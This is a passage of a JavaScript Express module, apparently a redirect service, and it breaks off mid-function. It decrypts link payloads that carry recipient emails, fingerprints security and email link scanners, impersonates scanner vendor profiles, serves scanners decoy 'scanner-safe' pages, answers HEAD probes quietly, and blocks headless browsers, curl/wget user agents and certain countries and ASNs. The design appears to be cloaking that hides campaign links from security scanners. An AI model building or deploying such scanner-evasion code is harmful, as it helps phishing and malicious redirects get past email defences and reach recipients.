"use strict";

function createRedirectCore(dependencies) {
  const {
    ADMIN_HITS_MAX_ENTRIES,
    ADMIN_HIT_TTL_MS,
    BEHAVIORAL_CONFIG,
    EMAIL_DISPLAY_MAX_LENGTH,
    HEADLESS_BLOCK,
    HEADLESS_SOFT_STRIKE,
    HEADLESS_STRIKE_WEIGHT,
    IMPERSONATE_MIN_CONFIDENCE,
    IMPERSONATE_SCANNER,
    KNOWN_SCANNER_IPS,
    KNOWN_SCANNER_MAX,
    LOG_ENTRY_MAX_LENGTH,
    MAX_TOKEN_AGE_SEC,
    MEMORY_PRESSURE_HEAP_USED_MB,
    MEMORY_PRESSURE_HEAP_USED_RATIO,
    OPS_METRICS,
    PATH_TRUNCATE_LENGTH,
    REQUEST_HISTORY,
    REQUIRE_CF_HEADERS,
    SCANNER_GENERIC_PROFILE,
    SCANNER_INTERSTITIAL_SCOPE,
    SCANNER_SAFE_HTML_ENABLED,
    UA_TRUNCATE_LENGTH,
    URL_DISPLAY_MAX_LENGTH,
    VISIBLE_IP_REPUTATION_WEIGHTS,
    addDenyCache,
    addLog,
    addSpacer,
    addStrike,
    adminHits,
    aggregatePerIpEvent,
    app,
    applyScannerCompatHeaders,
    applyScannerProfileHeaders,
    asnBlocked,
    boundedMapSet,
    buildScannerInterstitialContext,
    countryBlocked,
    createChallengeRedirect,
    createChallengeToken,
    crypto,
    decodeB64urlLoose,
    decodeEmailPart,
    detectScannerEnhancedWithBehavior,
    getRequestScannerDetection,
    evaluateRedirectPayloadSize,
    explainDecryptFailure,
    extractEmailSafePayloadPath,
    formatRequestIdentityLogSuffix,
    getASN,
    getClientIp,
    getCountryResolutionAsync,
    getDenyCache,
    getDenyCacheIp,
    getNormalizedRequestPathForPolicy,
    getRequestIdentity,
    hasCloudflareHeaders,
    hashFirstSeg,
    hashUaForToken,
    headlessSuspicion,
    incrementOpsMetric,
    incrementScannerDecisionCounter,
    isBanned,
    isBrownoutActive,
    isHostAllowlisted,
    isKnownScannerIp,
    isLikelyEmail,
    isOperationalBypassPath,
    isRateLimited,
    logScannerHit,
    maskEmail,
    maybeDenyForVisibleIpReputation,
    maybeLogRedirectPayloadSizeDecision,
    normHost,
    parseRedirectPayload,
    pathMatchesWithOptionalPrefix,
    pickScannerProfile,
    recordChallengeBypassAttempt,
    recordOffenderSignals,
    recordScannerIp,
    renderScannerSafeHtmlForScanner,
    safeDecode,
    safeLogJson,
    safeLogValue,
    sanitizeChallengeReason,
    shouldApplyProfileHeadersForRequest,
    shouldImpersonateForRequest,
    shouldServeScannerInterstitial,
    tryDecryptAny,
    tryDecryptAtKnownDelimiterBoundaries,
    utcDayStamp,
    validateBase64Url,
    verifyLinkHmac,
    verifyTurnstileToken,
    withOptionalUrlPrefix
  } = dependencies;

// ================== CORE REDIRECT / INTERSTITIAL HELPERS ==================
const INTERSTITIAL_REASON_TEXT = {
  "Pre-scan": "Pre-scan",
  "Email-safe path": "Email-safe path",
  "HEAD-probe": "HEAD probe",
  "GET-probe": "GET probe",
  "OPTIONS-probe": "OPTIONS probe",
  "Known scanner UA": "Known scanner user agent"
};

const INTERSTITIAL_REASON_CODE_MAP = {
  "Pre-scan": "pre_scan",
  "Email-safe path": "email_safe_path",
  "HEAD-probe": "head_probe",
  "GET-probe": "get_probe",
  "OPTIONS-probe": "options_probe",
  "Known scanner UA": "known_scanner_ua",
  "Known scanner fingerprint": "known_scanner_fingerprint"
};

const INTERSTITIAL_REASON_HEADER_ENABLED = (process.env.INTERSTITIAL_REASON_HEADER || "0") === "1";

function toReasonCode(reason) {
  const key = String(reason || "Pre-scan");
  if (INTERSTITIAL_REASON_CODE_MAP[key]) return INTERSTITIAL_REASON_CODE_MAP[key];
  return key
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "_")
    .replace(/^_+|_+$/g, "")
    .slice(0, 64) || "pre_scan";
}

function mapInterstitialReason(reason) {
  if (!reason) return "Pre-scan";
  const key = String(reason);
  return INTERSTITIAL_REASON_TEXT[key] || key;
}

const INTERSTITIAL_STATE = new Map();
const INTERSTITIAL_TTL_MS = 60 * 60 * 1000; // 1 hour
const INTERSTITIAL_MAX_ENTRIES = 10000;

// Some link scanners issue anonymous HEAD requests across many campaign paths,
// then follow them with anonymous GETs. Optional-prefix normalization means the
// HEAD and GET payload strings are not always identical. Track the scanner lane
// by IP instead; follow-up GETs still have to be completely headerless, so a real
// browser sharing the IP is not caught by this state.
const RECENT_HEAD_PROBES = new Map();
const RECENT_HEAD_PROBE_TTL_MS = 2 * 60 * 1000;
const RECENT_HEAD_PROBE_MAX_ENTRIES = 10000;

function headProbeKey(req) {
  const identity = getRequestIdentity(req);
  return identity.keyIp || identity.denyCacheKey || "unknown";
}

function pruneExpiredHeadProbes(now) {
  // boundedMapSet refreshes an existing key by moving it to the end, so entries
  // remain ordered from least- to most-recently seen. Stop at the first fresh
  // entry instead of walking the entire map during every scanner request.
  for (const [key, seenAt] of RECENT_HEAD_PROBES.entries()) {
    if ((now - Number(seenAt || 0)) <= RECENT_HEAD_PROBE_TTL_MS) break;
    RECENT_HEAD_PROBES.delete(key);
  }
}

function rememberHeadProbe(req) {
  const now = Date.now();
  pruneExpiredHeadProbes(now);
  boundedMapSet(RECENT_HEAD_PROBES, headProbeKey(req), now, RECENT_HEAD_PROBE_MAX_ENTRIES);
}

function isRecentHeaderlessScannerGet(req) {
  if (req.method !== "GET") return false;
  if (req.get("user-agent") || req.get("accept-language") || req.get("accept")) return false;
  const key = headProbeKey(req);
  const seenAt = Number(RECENT_HEAD_PROBES.get(key) || 0);
  if (!seenAt || (Date.now() - seenAt) > RECENT_HEAD_PROBE_TTL_MS) {
    RECENT_HEAD_PROBES.delete(key);
    return false;
  }
  return true;
}

function sendHeaderlessScannerFollowupResponse(req, res, payloadPath, source) {
  logScannerHit(req, "HEAD-probe follow-up", payloadPath);
  logScannerSafetyLane(req, payloadPath, "head_followup_get", "HEAD-probe follow-up", source);
  applyScannerCompatHeaders(res);
  setInterstitialReasonHeader(res, "HEAD-probe");
  res.setHeader("Cache-Control", "no-store");
  // Do not include an HTML challenge link: aggressive scanners follow it and
  // exhaust the challenge limiter even though no human is involved.
  return res.status(204).end();
}

function pruneInterstitialState(now) {
  for (const [key, entry] of INTERSTITIAL_STATE.entries()) {
    const lastSeenAt = Number(entry?.lastSeenAt || 0);
    if (!lastSeenAt || (now - lastSeenAt) > INTERSTITIAL_TTL_MS) {
      INTERSTITIAL_STATE.delete(key);
    }
  }

  if (INTERSTITIAL_STATE.size <= INTERSTITIAL_MAX_ENTRIES) return;
  const it = INTERSTITIAL_STATE.keys();
  const firstKey = it.next().value;
  if (firstKey) {
    INTERSTITIAL_STATE.delete(firstKey);
  }
}

function pruneMapToTargetSize(map, targetSize, getRankValue = null) {
  if (!map || map.size <= targetSize) return 0;
  const removeCount = Math.max(1, map.size - targetSize);
  let removed = 0;

  if (typeof getRankValue === "function") {
    const ranked = [];
    for (const [key, value] of map.entries()) {
      ranked.push([key, Number(getRankValue(value, key)) || 0]);
    }
    ranked.sort((a, b) => a[1] - b[1]);
    for (let i = 0; i < removeCount; i += 1) {
      const item = ranked[i];
      if (!item) break;
      if (map.delete(item[0])) removed += 1;
    }
    return removed;
  }

  const keys = map.keys();
  while (map.size > targetSize) {
    const next = keys.next();
    if (!next || next.done) break;
    if (map.delete(next.value)) removed += 1;
  }
  return removed;
}

function applyMemoryPressureRelief(now = Date.now(), reason = "periodic") {
  const targetHistory = Math.max(500, Math.floor(BEHAVIORAL_CONFIG.maxIpsBeforeCleanup * 0.6));
  const targetInterstitial = Math.max(500, Math.floor(INTERSTITIAL_MAX_ENTRIES * 0.6));
  const targetKnownScanners = Math.max(500, Math.floor(KNOWN_SCANNER_MAX * 0.6));
  const targetAdminHits = Math.max(100, Math.floor(ADMIN_HIT_TTL_MS / 1000));

  const evicted = {
    requestHistory: 0,
    interstitialState: 0,
    knownScannerIps: 0,
    adminHits: 0
  };

  if (REQUEST_HISTORY.size > targetHistory) {
    evicted.requestHistory = pruneMapToTargetSize(REQUEST_HISTORY, targetHistory, (entries) => {
      if (!Array.isArray(entries) || !entries.length) return 0;
      return Number(entries[entries.length - 1].timestamp || 0);
    });
  }
  if (INTERSTITIAL_STATE.size > targetInterstitial) {
    evicted.interstitialState = pruneMapToTargetSize(
      INTERSTITIAL_STATE,
      targetInterstitial,
      (entry) => Number(entry && entry.lastSeenAt || 0)
    );
  }
  if (KNOWN_SCANNER_IPS.size > targetKnownScanners) {
    evicted.knownScannerIps = pruneMapToTargetSize(
      KNOWN_SCANNER_IPS,
      targetKnownScanners,
      (entry) => Number(entry && entry.lastSeen || 0)
    );
  }
  if (adminHits.size > targetAdminHits) {
    evicted.adminHits = pruneMapToTargetSize(
      adminHits,
      targetAdminHits,
      (entry) => Number(entry && entry.resetAt || 0)
    );
  }

  const totalEvicted = Object.values(evicted).reduce((sum, n) => sum + n, 0);
  if (totalEvicted > 0) {
    addLog(`[MEMORY] relief reason=${safeLogValue(reason, 48)} evicted=${totalEvicted} requestHistory=${evicted.requestHistory} interstitial=${evicted.interstitialState} knownScannerIps=${evicted.knownScannerIps} adminHits=${evicted.adminHits}`);
  }
  return totalEvicted;
}

function shouldApplyMemoryPressureRelief(mem = process.memoryUsage()) {
  const heapUsedMb = Number(mem && mem.heapUsed || 0) / (1024 * 1024);
  const heapTotal = Number(mem && mem.heapTotal || 0);
  const heapRatio = heapTotal > 0 ? Number(mem.heapUsed || 0) / heapTotal : 0;

  return (
    (heapUsedMb >= MEMORY_PRESSURE_HEAP_USED_MB && heapRatio >= MEMORY_PRESSURE_HEAP_USED_RATIO) ||
    REQUEST_HISTORY.size > BEHAVIORAL_CONFIG.maxIpsHardCap ||
    INTERSTITIAL_STATE.size > Math.floor(INTERSTITIAL_MAX_ENTRIES * 1.1) ||
    KNOWN_SCANNER_IPS.size > Math.floor(KNOWN_SCANNER_MAX * 1.1) ||
    adminHits.size > ADMIN_HITS_MAX_ENTRIES
  );
}

function markInterstitialShown(nextEnc) {
  const key = String(nextEnc || "");
  const now = Date.now();
  let entry = INTERSTITIAL_STATE.get(key);
  const firstHit = !entry;
  if (!entry) {
    entry = { firstSeenAt: now, lastSeenAt: now, humanSeen: false };
  } else {
    entry.lastSeenAt = now;
  }
  boundedMapSet(INTERSTITIAL_STATE, key, entry, INTERSTITIAL_MAX_ENTRIES);
  pruneInterstitialState(now);
  return { firstHit, humanSeen: !!entry.humanSeen };
}

function markInterstitialHuman(nextEnc) {
  const key = String(nextEnc || "");
  const now = Date.now();
  let entry = INTERSTITIAL_STATE.get(key);
  if (!entry) {
    entry = { firstSeenAt: now, lastSeenAt: now, humanSeen: true };
  } else {
    entry.humanSeen = true;
    entry.lastSeenAt = now;
  }
  boundedMapSet(INTERSTITIAL_STATE, key, entry, INTERSTITIAL_MAX_ENTRIES);
  pruneInterstitialState(now);
  return entry;
}

const INTERSTITIAL_BYPASS_SECRET = process.env.INTERSTITIAL_BYPASS_SECRET || "";

function hasInterstitialBypass(req) {
  if (!INTERSTITIAL_BYPASS_SECRET) return false;

  const q = req.query || {};
  if (q.ib && q.ib === INTERSTITIAL_BYPASS_SECRET) return true;

  const hdr = req.get("x-interstitial-bypass");
  if (hdr && hdr === INTERSTITIAL_BYPASS_SECRET) return true;

  return false;
}

function renderScannerSafePage(req, res, nextEnc, reason = "Pre-scan", options = {}) {
  applyScannerCompatHeaders(res);
  if (IMPERSONATE_SCANNER && options.scannerProfile) {
    applyScannerProfileHeaders(res, options.scannerProfile);
  }

  setInterstitialReasonHeader(res, reason);

  const mappedReason = mapInterstitialReason(reason);
  const emailSafe = options.emailSafe === true || reason === "Email-safe path";
  const allowAuto = options.allowAuto === true ? true : !emailSafe;

  const stateInfo = markInterstitialShown(nextEnc);
  const challengeToken = createChallengeToken(nextEnc, req, mappedReason);
  const nonce = res.locals.cspNonce || crypto.randomBytes(16).toString("base64");

  res.setHeader("Cache-Control", "no-store");
  try {
    res.setHeader(
      "Content-Security-Policy",
      `default-src 'none'; script-src 'nonce-${nonce}'; style-src 'unsafe-inline'; base-uri 'none'; frame-ancestors 'none'; form-action 'self';`
    );
  } catch {}

  const cfg = {
    ct: challengeToken,
    next: nextEnc,
    allowAuto,
    firstHit: !!stateInfo.firstHit,
    humanSeen: !!stateInfo.humanSeen,
    emailSafe: !!emailSafe
  };
  const cfgJson = JSON.stringify(cfg);

  const html = `<!doctype html><html><head>
<meta charset="utf-8">
<title>Checking link…</title>
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
  <h1>Checking this link</h1>
  <p>This link was pre-scanned by security or preview software. If you're the intended recipient, click continue.</p>
  <p><a id="continue-link" href="${withOptionalUrlPrefix("/challenge")}?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
  <p style="color:#6b7280;font-size:14px">Reason: ${mappedReason}</p>
  <script nonce="${nonce}">
    (function(){
      var cfg = ${cfgJson};
      try {
        if (cfg && cfg.next) {
          var payload = JSON.stringify({ next: cfg.next });
          if (navigator.sendBeacon) {
            var blob = new Blob([payload], { type: "application/json" });
            navigator.sendBeacon(${JSON.stringify(withOptionalUrlPrefix("/interstitial-human"))}, blob);
          } else if (window.fetch) {
            fetch(${JSON.stringify(withOptionalUrlPrefix("/interstitial-human"))}, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: payload,
              keepalive: true
            }).catch(function(){});
          }
        }
      } catch (e) {}

      if (!cfg.allowAuto) return;
      if (cfg.firstHit || !cfg.humanSeen) return;

      setTimeout(function(){
        try {
          if (document.visibilityState && document.visibilityState !== "visible") return;
          window.location.href = ${JSON.stringify(`${withOptionalUrlPrefix("/challenge")}?ct=`)} + encodeURIComponent(cfg.ct);
        } catch (e) {}
      }, 1200);
    })();
  </script>
</body>
</html>`;

  res.type("html").send(html);
}

function setInterstitialReasonHeader(res, reason) {
  if (!res || typeof res.setHeader !== "function") return;
  if (!INTERSTITIAL_REASON_HEADER_ENABLED || res.getHeader("X-Interstitial-Reason-Code")) return;
  res.setHeader("X-Interstitial-Reason-Code", toReasonCode(reason));
}

function logScannerSafetyLane(req, payloadPath, mode, reason, source = "unknown") {
  const ip = getClientIp(req);
  const virtualPath = payloadPath ? "/e/[redacted]" : "/e";
  const requestPath = String(source).startsWith("email-safe") ? "/e/[redacted]" : "/[redacted]";
  addLog(`[SCANNER-SAFETY-LANE] source=${safeLogValue(source, 32)} virtualPath=${virtualPath} mode=${safeLogValue(mode, 48)} reason=${safeLogValue(reason || "-", 80)} ip=${safeLogValue(ip, 64)} method=${safeLogValue(req.method, 12)} originalPath=${requestPath}`);
}

function sendScannerSafetyLaneHeadResponse(req, res, payloadPath, reason = "HEAD-probe", options = {}) {
  rememberHeadProbe(req);
  const scannerProfile = options.scannerProfile || null;
  applyScannerCompatHeaders(res);
  if (scannerProfile) {
    applyScannerProfileHeaders(res, scannerProfile);
  }
  setInterstitialReasonHeader(res, reason);
  logScannerSafetyLane(req, payloadPath, "head_probe", reason, options.source || "email-safe");
  return res.status(200).type("html").end();
}

async function tryRenderTrustedScannerSafeHtmlForPayload(req, res, baseString, securityCheck = {}, options = {}) {
  if (req.method !== "GET" || !securityCheck.scannerSafeHtmlEligible) return false;

  const clientIp = options.clientIp || getClientIp(req);
  const ua = options.ua || req.get("user-agent") || "";
  const linkHash = options.linkHash || (req.query && req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString));

  const decryptResult = decryptAndParseUrl(req, baseString);
  if (decryptResult.error) {
    const nextEnc = encodeURIComponent(baseString);
    const scannerReason = securityCheck.scannerReason || "Known scanner UA";
    logScannerHit(req, scannerReason, nextEnc);
    logScannerSafetyLane(req, baseString, "interstitial_fallback", scannerReason, options.source || "catchall");
    renderScannerSafePage(req, res, nextEnc, scannerReason, {
      scannerProfile: securityCheck.scannerProfile
    });
    return true;
  }

  const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
  let parsedFinalUrl;
  try {
    parsedFinalUrl = new URL(finalUrl);
  } catch (error) {
    addLog(`[URL] invalid ip=${safeLogValue(clientIp)} value="${safeLogValue((finalUrl || ""), URL_DISPLAY_MAX_LENGTH)}" err="${safeLogValue(error.message)}"`);
    addSpacer();
    res.status(400).send("Invalid URL");
    return true;
  }

  const hostname = normHost(parsedFinalUrl.hostname);
  const protocol = parsedFinalUrl.protocol;
  const normalizedPinnedHost = decryptResult.pinnedHost ? normHost(decryptResult.pinnedHost) : null;
  if (!["http:", "https:"].includes(protocol)) {
    addLog(`[ALLOWLIST] blocked protocol=${safeLogValue(protocol)} host=${safeLogValue(hostname)} ip=${safeLogValue(clientIp)}`);
    addSpacer();
    res.status(403).send("Unauthorized URL");
    return true;
  }
  if (normalizedPinnedHost && normalizedPinnedHost !== hostname) {
    logHostPinFailure({ ip: clientIp, ua, linkHash: decryptResult.linkHash || linkHash, pinnedHost: normalizedPinnedHost, actualHost: hostname });
    renderInvalidLinkPage(res);
    return true;
  }
  if (!isHostAllowlisted(hostname)) {
    addLog(`[ALLOWLIST] blocked host=${hostname} ip=${clientIp}`);
    addSpacer();
    res.status(403).send("Unauthorized URL");
    return true;
  }

  decryptResult.finalUrl = finalUrl;
  decryptResult.ciphertext = encodeURIComponent(baseString);
  decryptResult.scannerProfile = securityCheck.scannerSafeHtmlProfile || securityCheck.scannerProfile || null;
  req._decryptedUrl = finalUrl;
  req._scannerSafeHtmlMode = true;
  logScannerSafetyLane(req, baseString, "scanner-safe-html", securityCheck.scannerReason || "Known scanner UA", options.source || "catchall");
  await renderScannerSafeHtmlForScanner(req, res, decryptResult);
  return true;
}

// Global ops metrics (daily request totals + friction proxies)
app.use((req, res, next) => {
  const day = utcDayStamp();
  incrementOpsMetric(OPS_METRICS.requestsByDay, day, "total_requests", 1);

  res.on("finish", () => {
    const status = Number(res.statusCode || 0);
    if (status === 401 || status === 403 || status === 404 || status === 429) {
      incrementOpsMetric(OPS_METRICS.frictionByDay, day, `status_${status}`, 1);
      incrementOpsMetric(OPS_METRICS.frictionByDay, day, "friction_total", 1);
    }
  });
  next();
});

// --- Early short-circuit for HEAD/OPTIONS scanner-style probes on deep links ---
app.use((req, res, next) => {
  Promise.resolve((async () => {
  if (hasInterstitialBypass(req)) return next();

  // allow your own health, logs, and challenge endpoints through
  if (
    pathMatchesWithOptionalPrefix(req.path, "/health", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/healthz", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/readyz", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/livez", { allowChildren: false }) ||
    req.path.startsWith("/view-log") ||
    pathMatchesWithOptionalPrefix(req.path, "/challenge") ||
    pathMatchesWithOptionalPrefix(req.path, "/ts-client-log", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/interstitial-human", { allowChildren: false })
  ) {
    return next();
  }

  // During brownout, record/security evaluation happens in the brownout
  // middleware below; do not render scanner-safe HTML while overloaded.
  if (isBrownoutActive()) return next();

  // only care about HEAD/OPTIONS prefetches (scanner probes)
  if (req.method !== "HEAD" && req.method !== "OPTIONS") return next();

  // Handle /e/* specifically (email-safe deep links)
  if (pathMatchesWithOptionalPrefix(req.path, "/e")) {
    const clean = extractEmailSafePayloadPath(req);
    const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
    if (req.method === "HEAD") {
      logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
      return sendScannerSafetyLaneHeadResponse(req, res, clean, "HEAD-probe", {
        scannerProfile: scannerCtx.scannerProfile,
        source: "email-safe"
      });
    }
    if (scannerCtx.scannerSafeHtmlEligible) {
      const handled = await tryRenderTrustedScannerSafeHtmlForPayload(req, res, clean, scannerCtx, {
        source: "email-safe"
      });
      if (handled) return;
    }
    logScannerHit(req, scannerCtx.scannerReason || (req.method + "-probe"), clean);
    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || (req.method + "-probe"), {
      emailSafe: true,
      scannerProfile: scannerCtx.scannerProfile
    });
  }

  const url = req.originalUrl || "";
  const clean = url.replace(/^\//, "").split("?")[0];
  const looksDeep = validateBase64Url(clean);

  if (looksDeep) {
    const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
    if (req.method === "HEAD") {
      logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
      return sendScannerSafetyLaneHeadResponse(req, res, clean, "HEAD-probe", {
        scannerProfile: scannerCtx.scannerProfile,
        source: "catchall"
      });
    }
    logScannerHit(req, scannerCtx.scannerReason || (req.method + "-probe"), clean);
    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || (req.method + "-probe"), {
      scannerProfile: scannerCtx.scannerProfile
    });
  }

  return next();
  })()).catch(next);
});

// --- OPTIONAL: catch GET probes on /e/... and show the safe interstitial ---
app.use((req, res, next) => {
  Promise.resolve((async () => {
  if (hasInterstitialBypass(req)) return next();

  // Let your own endpoints through untouched
  if (
    pathMatchesWithOptionalPrefix(req.path, "/health", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/healthz", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/readyz", { allowChildren: false }) ||
    req.path.startsWith("/view-log") ||
    pathMatchesWithOptionalPrefix(req.path, "/challenge") ||
    pathMatchesWithOptionalPrefix(req.path, "/ts-client-log", { allowChildren: false }) ||
    pathMatchesWithOptionalPrefix(req.path, "/interstitial-human", { allowChildren: false })
  ) {
    return next();
  }

  // During brownout, defer to the brownout middleware so /e scanner probes are
  // shed with Retry-After instead of rendering interstitial HTML.
  if (isBrownoutActive()) return next();

  if (req.method === "GET" && pathMatchesWithOptionalPrefix(req.path, "/e")) {
    const clean = extractEmailSafePayloadPath(req);
    if (isRecentHeaderlessScannerGet(req)) {
      return sendHeaderlessScannerFollowupResponse(req, res, clean, "email-safe");
    }
    const scannerCtx = buildScannerInterstitialContext(req, "GET-probe");
    if (scannerCtx.scannerSafeHtmlEligible) {
      const handled = await tryRenderTrustedScannerSafeHtmlForPayload(req, res, clean, scannerCtx, {
        source: "email-safe"
      });
      if (handled) return;
    }
    logScannerHit(req, scannerCtx.scannerReason || "GET-probe", clean);
    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || "GET-probe", {
      emailSafe: true,
      scannerProfile: scannerCtx.scannerProfile
    });
  }

  return next();
  })()).catch(next);
});

function createSecurityPolicyContext(req) {
  return {
    ip: getClientIp(req),
    denyCacheIp: getDenyCacheIp(req),
    ua: req.get("user-agent") || "",
    bypassInterstitial: hasInterstitialBypass(req)
  };
}

function checkDenyCachePolicy(req, ctx) {
  const denyHit = getDenyCache(ctx.denyCacheIp);
  if (!denyHit) return null;
  const shouldLog = aggregatePerIpEvent("DENY_CACHE", { ip: ctx.ip, reason: denyHit.reason });
  if (shouldLog) {
    addLog(`[DENY-CACHE] blocked ip=${safeLogValue(ctx.ip)} reason=${safeLogValue(denyHit.reason, 32)}${formatRequestIdentityLogSuffix(req)}`);
    addSpacer();
  }
  recordOffenderSignals(req);
  return { blocked: true, status: 403, message: "Forbidden" };
}

function checkCloudflareHeaderPolicy(req, ctx) {
  if (!REQUIRE_CF_HEADERS || hasCloudflareHeaders(req)) return null;
  addLog(`[CF] missing headers ip=${safeLogValue(ctx.ip)} ua="${safeLogValue(ctx.ua.slice(0, UA_TRUNCATE_LENGTH))}"`);
  addSpacer();
  recordOffenderSignals(req);
  return { blocked: true, status: 403, message: "Forbidden" };
}

function logInterstitialBypassIfActive(ctx) {
  if (!ctx.bypassInterstitial) return;
  addLog(`[BYPASS] interstitial bypass active ip=${safeLogValue(ctx.ip)} ua="${safeLogValue(ctx.ua.slice(0, UA_TRUNCATE_LENGTH))}"`);
  addSpacer();
}

function checkIpBanPolicy(req, ctx) {
  const bannedIpKey = isBanned(ctx.denyCacheIp)
    ? ctx.denyCacheIp
    : (ctx.ip !== ctx.denyCacheIp && isBanned(ctx.ip) ? ctx.ip : null);
  if (!bannedIpKey) return null;
  addLog(`[BAN] blocked ip=${safeLogValue(ctx.ip)} banKey=${safeLogValue(bannedIpKey)}${formatRequestIdentityLogSuffix(req)}`);
  addSpacer();
  recordOffenderSignals(req);
  return { blocked: true, status: 403, message: "Forbidden" };
}

function checkScannerPolicy(req, ctx) {
  if (ctx.bypassInterstitial) return null;
  const scannerResult = getRequestScannerDetection(req);
  if (!scannerResult.isScanner) return null;

  // --- ADD THIS LINE ---
  addLog(`[SCANNER-HEADERS] ${safeLogJson(req.headers, 2000)}`);
  // ---------------------

  const scannerDetections = scannerResult.detections;
  const topDetection = scannerDetections[0] || { name: "scanner", confidence: 0.5 };
  recordScannerIp(ctx.ip, topDetection.name);
  const knownScanner = isKnownScannerIp(ctx.ip);
  incrementScannerDecisionCounter("scanner_detected_total");
  const shouldImpersonate = shouldImpersonateForRequest(req, scannerResult, knownScanner, topDetection);
  const allowVendorProfileHeaders = shouldApplyProfileHeadersForRequest(req, scannerResult, knownScanner, topDetection);
  const detectedScannerProfile = pickScannerProfile(topDetection, req, knownScanner, scannerResult, false);
  const scannerProfile = (shouldImpersonate && allowVendorProfileHeaders)
    ? detectedScannerProfile
    : null;
  if (scannerProfile) incrementScannerDecisionCounter("scanner_impersonated_total");
  if (scannerProfile && scannerProfile.name) incrementScannerDecisionCounter(`scanner_profile_${String(scannerProfile.name).replace(/[^a-zA-Z0-9_-]/g, "_")}_total`);
  const shouldInterstitial = shouldServeScannerInterstitial(req);
  if (shouldInterstitial) {
    incrementScannerDecisionCounter("scanner_interstitial_served_total");
    incrementOpsMetric(OPS_METRICS.frictionByDay, utcDayStamp(), "scanner_interstitial", 1);
  }

  addLog(`[SCANNER] interstitial=${shouldInterstitial ? "1" : "0"} scope=${safeLogValue(SCANNER_INTERSTITIAL_SCOPE, 16)} ip=${safeLogValue(ctx.ip)} scanner="${safeLogValue(topDetection.name)}" confidence=${safeLogValue(String(topDetection.confidence ?? ""))} known=${knownScanner ? "1" : "0"} impersonate=${shouldImpersonate ? "1" : "0"} strictProfile=${allowVendorProfileHeaders ? "1" : "0"} profile=${safeLogValue((scannerProfile && scannerProfile.name) || "none")} ua="${safeLogValue(ctx.ua.slice(0, UA_TRUNCATE_LENGTH))}"`);
  recordOffenderSignals(req);

  const confidence = Number(topDetection.confidence || 0);
  const scannerSafeHtmlProfile = detectedScannerProfile && detectedScannerProfile.name !== SCANNER_GENERIC_PROFILE.name
    ? detectedScannerProfile
    : null;
  const trustedScannerProfile = !!scannerSafeHtmlProfile;
  // Reuse the scanner impersonation confidence gate, but only serve scanner-safe
  // HTML to concrete trusted scanner profiles so generic automation UAs stay blocked.
  const scannerSafeHtmlEligible = SCANNER_SAFE_HTML_ENABLED && trustedScannerProfile && confidence >= IMPERSONATE_MIN_CONFIDENCE;
  if (!shouldInterstitial && !scannerSafeHtmlEligible) return { blocked: true, status: 404, message: "Not Found" };
  const reason = scannerProfile ? "Known scanner fingerprint" : topDetection.name;
  return {
    blocked: true,
    interstitial: true,
    scanner: topDetection.name,
    scannerConfidence: confidence,
    scannerProfile,
    scannerSafeHtmlProfile,
    scannerReason: reason,
    scannerSafeHtmlEligible
  };
}

function checkBadUaPolicy(req, ctx) {
  const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
  if (ctx.bypassInterstitial || !BAD_UA.test(ctx.ua)) return null;
  addLog(`[UA-BLOCK] ip=${ctx.ip} ua="${ctx.ua.slice(0, UA_TRUNCATE_LENGTH)}"`);
  addSpacer();
  addDenyCache(ctx.denyCacheIp, "ua_block");
  recordOffenderSignals(req);
  return { blocked: true, status: 403, message: "Forbidden" };
}

function checkHeadlessPolicy(req, ctx) {
  if (ctx.bypassInterstitial) return null;
  const hs = headlessSuspicion(req);
  if (!hs.suspicious) return null;

  const softOnlyOne = hs.hardCount === 0 && hs.softCount === 1;
  const label = hs.hardCount >= 1
    ? "HEADLESS"
    : (hs.isSafariUA || hs.isFirefoxUA) && softOnlyOne
    ? "INFO"
    : hs.softCount >= 2
    ? "SUSPECT"
    : "INFO";
  addLog(`[${label}] ip=${safeLogValue(ctx.ip)} reasons=${safeLogValue(hs.reasons.join(","))}`);

  if (hs.hardCount > 0) {
    addStrike(ctx.ip, HEADLESS_STRIKE_WEIGHT);
    maybeDenyForVisibleIpReputation(req, ctx.ip, "headless", { detail: hs.reasons.join("|"), weight: VISIBLE_IP_REPUTATION_WEIGHTS.headless });
  } else if (HEADLESS_SOFT_STRIKE && hs.softCount >= 2) {
    addStrike(ctx.ip, 1);
    maybeDenyForVisibleIpReputation(req, ctx.ip, "headless", { detail: hs.reasons.join("|"), weight: 2 });
  }

  if (HEADLESS_BLOCK && hs.hardCount > 0) {
    addSpacer();
    addDenyCache(ctx.denyCacheIp, "headless_hard");
    recordOffenderSignals(req);
    return { blocked: true, status: 403, message: "Forbidden" };
  }
  return null;
}

async function checkGeoAsnPolicy(req, ctx) {
  const countryResolution = await getCountryResolutionAsync(req) || { country: null, source: "none" };
  const ctry = countryResolution.country;
  const asn = countryResolution.asn || getASN(req);
  if (countryBlocked(ctry)) {
    const shouldLog = aggregatePerIpEvent("GEO", { ip: ctx.ip, country: ctry, reason: "country_block" });
    if (shouldLog) {
      addLog(`[GEO] blocked country=${safeLogValue(ctry)} ip=${safeLogValue(ctx.ip)}${formatRequestIdentityLogSuffix(req, { geoSource: countryResolution.source })}`);
      addSpacer();
    }
    const geoSourceTag = String((countryResolution && countryResolution.source) || "unknown").toLowerCase().replace(/[^a-z0-9:_-]/g, "_").slice(0, 40);
